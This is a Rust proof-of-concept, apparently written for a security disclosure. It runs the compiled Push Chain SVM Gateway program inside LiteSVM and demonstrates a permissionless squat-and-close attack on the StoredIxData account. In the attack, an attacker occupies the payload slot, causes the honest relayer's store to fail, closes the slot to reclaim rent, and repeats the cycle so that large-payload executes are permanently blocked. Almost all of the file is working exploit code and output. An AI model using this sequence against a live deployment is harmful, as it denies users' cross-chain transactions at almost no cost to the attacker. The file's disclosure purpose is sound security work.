// PoC — Push Chain SVM Gateway: permissionless squat-and-close on StoredIxData.
//
// Runs the REAL compiled program (target/deploy/universal_gateway.so) inside
// LiteSVM. Nothing is reimplemented — every instruction is dispatched to the
// on-chain code exactly as a relayer or an attacker would send it.

use litesvm::LiteSVM;
use sha2::{Digest, Sha256};
use sha3::Keccak256;
use solana_sdk::{
    account::Account,
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    system_program,
    transaction::Transaction,
};

const PROGRAM_ID: Pubkey = solana_sdk::pubkey!("DJoFYDpgbTfxbXBv1QYhYGc9FK4J5FUKpYXAfSkHryXp");

const D_STORE: [u8; 8] = [177, 199, 114, 191, 66, 93, 93, 110];
const D_CLOSE: [u8; 8] = [58, 81, 153, 208, 99, 218, 247, 14];
const STORED_IX_DATA_SEED: &[u8] = b"stored_ix_data";

fn keccak(ix_data: &[u8]) -> [u8; 32] {
    let mut h = Keccak256::new();
    h.update(ix_data);
    let out = h.finalize();
    let mut r = [0u8; 32];
    r.copy_from_slice(&out);
    r
}

fn store_ix(caller: &Pubkey, pda: &Pubkey, sub: &[u8; 32], hash: &[u8; 32], ix: &[u8]) -> Instruction {
    let mut data = Vec::with_capacity(8 + 32 + 32 + 4 + ix.len());
    data.extend_from_slice(&D_STORE);
    data.extend_from_slice(sub);
    data.extend_from_slice(hash);
    data.extend_from_slice(&(ix.len() as u32).to_le_bytes());
    data.extend_from_slice(ix);
    Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(*caller, true),
            AccountMeta::new(*pda, false),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data,
    }
}

fn close_ix(caller: &Pubkey, pda: &Pubkey, refund: &Pubkey) -> Instruction {
    // `executed_sub_tx` is an Option account. Anchor signals None by passing the
    // program's own id in that slot, so it must still be present in the list.
    Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(*caller, true),
            AccountMeta::new(*pda, false),
            AccountMeta::new(*refund, false),
            AccountMeta::new_readonly(PROGRAM_ID, false),
        ],
        data: D_CLOSE.to_vec(),
    }
}

fn main() {
    let mut svm = LiteSVM::new();
    let so = std::fs::read(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/../pushchain/contracts/svm-gateway/target/deploy/universal_gateway.so"
    ))
    .expect("build the program first with cargo-build-sbf");
    svm.add_program(PROGRAM_ID, &so);

    let attacker = Keypair::new();
    let relayer = Keypair::new();
    for kp in [&attacker, &relayer] {
        svm.airdrop(&kp.pubkey(), 10_000_000_000).unwrap();
    }
    let start_bal = svm.get_balance(&attacker.pubkey()).unwrap();

    // Public, source-chain-derived identifier. INTEGRATION_GUIDE: sub_tx_id must
    // be deterministic, recommended keccak256(event_tx_hash || log_index).
    let sub_tx_id: [u8; 32] = {
        let mut h = Sha256::new();
        h.update(b"public source-chain event for a large-payload execute");
        let mut r = [0u8; 32];
        r.copy_from_slice(&h.finalize());
        r
    };
    // Large payload: the ref route exists precisely for ix_data this size.
    let ix_data = vec![0xABu8; 1200];
    let hash = keccak(&ix_data);

    let (pda, _bump) =
        Pubkey::find_program_address(&[STORED_IX_DATA_SEED, &sub_tx_id, &hash], &PROGRAM_ID);

    let absent = |svm: &LiteSVM| svm.get_account(&pda).map_or(true, |a: Account| a.data.is_empty());
    let occupied = |svm: &LiteSVM| {
        svm.get_account(&pda)
            .map(|a: Account| a.owner == PROGRAM_ID && !a.data.is_empty())
            .unwrap_or(false)
    };

    println!("== Push Chain StoredIxData squat-and-close PoC (real compiled program) ==");
    println!("stored_ix_data PDA: {pda}");
    assert!(absent(&svm), "precondition: slot empty");

    // 1. Attacker occupies the slot permissionlessly.
    let ix = store_ix(&attacker.pubkey(), &pda, &sub_tx_id, &hash, &ix_data);
    let tx = Transaction::new_signed_with_payer(&[ix], Some(&attacker.pubkey()), &[&attacker], svm.latest_blockhash());
    svm.send_transaction(tx).expect("attacker store should succeed — it is permissionless");
    assert!(occupied(&svm));
    println!("[1] attacker occupied the slot (no privileged role, no TSS signature)");

    // 2. Honest relayer's store of the same slot fails.
    let ix = store_ix(&relayer.pubkey(), &pda, &sub_tx_id, &hash, &ix_data);
    let tx = Transaction::new_signed_with_payer(&[ix], Some(&relayer.pubkey()), &[&relayer], svm.latest_blockhash());
    assert!(svm.send_transaction(tx).is_err(), "relayer store of a live slot must fail");
    println!("[2] relayer's own store of the same slot FAILED (init on a live account)");

    // 3. Attacker closes pre-execution and recovers rent.
    let pre = svm.get_balance(&attacker.pubkey()).unwrap();
    let ix = close_ix(&attacker.pubkey(), &pda, &attacker.pubkey());
    let tx = Transaction::new_signed_with_payer(&[ix], Some(&attacker.pubkey()), &[&attacker], svm.latest_blockhash());
    svm.send_transaction(tx).expect("attacker close should succeed pre-execution");
    assert!(absent(&svm));
    let refunded = svm.get_balance(&attacker.pubkey()).unwrap().saturating_sub(pre);
    println!("[3] attacker closed the slot, refunded {refunded} lamports of rent");

    // 4. Repeatable at will.
    for round in 0..3 {
        svm.expire_blockhash(); // distinct blockhash so each cycle is a new tx
        let ix = store_ix(&attacker.pubkey(), &pda, &sub_tx_id, &hash, &ix_data);
        let tx = Transaction::new_signed_with_payer(&[ix], Some(&attacker.pubkey()), &[&attacker], svm.latest_blockhash());
        svm.send_transaction(tx).unwrap();
        let ix = close_ix(&attacker.pubkey(), &pda, &attacker.pubkey());
        let tx = Transaction::new_signed_with_payer(&[ix], Some(&attacker.pubkey()), &[&attacker], svm.latest_blockhash());
        svm.send_transaction(tx).unwrap();
        assert!(absent(&svm));
        println!("[4.{round}] re-occupied and released again; slot empty");
        let _ = round;
    }

    let net = start_bal as i128 - svm.get_balance(&attacker.pubkey()).unwrap() as i128;
    println!();
    println!(">>> attacker held the ref-route slot across 4 store/close cycles.");
    println!(">>> net attacker cost: {net} lamports (tx fees only; rent recovered every cycle).");
    println!(">>> the ref-finalize route can never find its ix_data, and for any finalize tx over");
    println!(">>> 1232 bytes the ref route is the only route -> permanent lockout of the execute.");
    println!();
    println!("ALL ASSERTIONS PASSED");
}
